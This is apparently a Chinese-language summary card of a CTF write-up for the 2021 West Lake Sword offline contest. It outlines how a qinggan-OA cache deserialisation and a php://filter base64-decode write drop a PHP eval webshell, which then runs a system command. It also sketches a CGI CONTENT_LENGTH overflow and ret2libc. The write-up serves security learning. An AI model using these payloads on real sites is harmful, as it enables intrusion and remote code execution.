---
title: "西湖论剑线下-WriteUp"
category: pwn
tags: ["西湖论剑线下", "pwn", "phpggc", "qinggan-OA", "base64-decode-filter", "cache-deserialize"]
signals: ["西湖论剑线下 2021", "phpggc", "qinggan-OA", "base64-decode-filter", "cache-deserialize", "CGI-auth", "content-length-overflow", "pwntools-IO", "ret2libc", "rce", "WriteUp", "web", "cache", "php"]
difficulty: hard
source: "https://www.ctfiot.com/30534.html"
tools: ["ROP", "pwntools"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 西湖论剑线下-WriteUp

> 赛事：西湖论剑线下 2021 | 方向：pwn | 难度：hard | 工具：ROP、pwntools

## 一句话总结

西湖论剑线下WriteUp,单点渗透web(qinggan-OA+phpggc+cache类反序列化+php://filter写somnus.php)+DPR纵深渗透靶场(CGI auth+CONTENT_LENGTH溢出)+IoT路由器环境变量读取。

## 攻击链

1. 单点渗透web:cache类__construct+key_id="php://filter/write=convert.base64-decode/resource=somnus"+folder="aa".base64_encode('<?php eval($_REQUEST["a"]);?>')
2. 触发:qinggan_fields INSERT INTO序列化cache对象→/api.php?c=call&data=...→写somnus.php
3. 访问:http://114.5.18.20/somnus.php?a=system('cat /flag')得flag
4. DPR纵深渗透靶场:sub_109F0检查auth+sub_10B48处理GET/POST+CONTENT_LENGTH<=3316
5. calloc+stdin fread→/api子函数处理
6. CGI程序:读取SERVER_SOFTWARE/SERVER_NAME/GATEWAY_INTERFACE/SERVER_PROTOCOL/SERVER_PORT/REQUEST_METHOD/PATH_INFO
7. 关键漏洞:CONTENT_LENGTH>3316可能溢出
8. 内核PWN:栈溢出+ret2libc
9. 总结:35道题,涵盖Web/Pwn/IoT/密码学

## 关键 payload

```
php://filter/write=convert.base64-decode/resource=somnus + cache反序列化
```

## 经验教训

国产CMS的cache类反序列化是常见入口,php://filter/write=convert.base64-decode是写入Webshell的稳定向量;DPR类纵深靶场是工业控制/IoT场景的标配;线下赛35道题覆盖广。

## 标签

phpggc、qinggan-OA、base64-decode-filter、cache-deserialize、CGI-auth、content-length-overflow、pwntools-IO、ret2libc、ROP、DPR-target

## 参考来源

- https://www.ctfiot.com/30534.html
- 原文件：西湖论剑线下-WriteUp.full.md
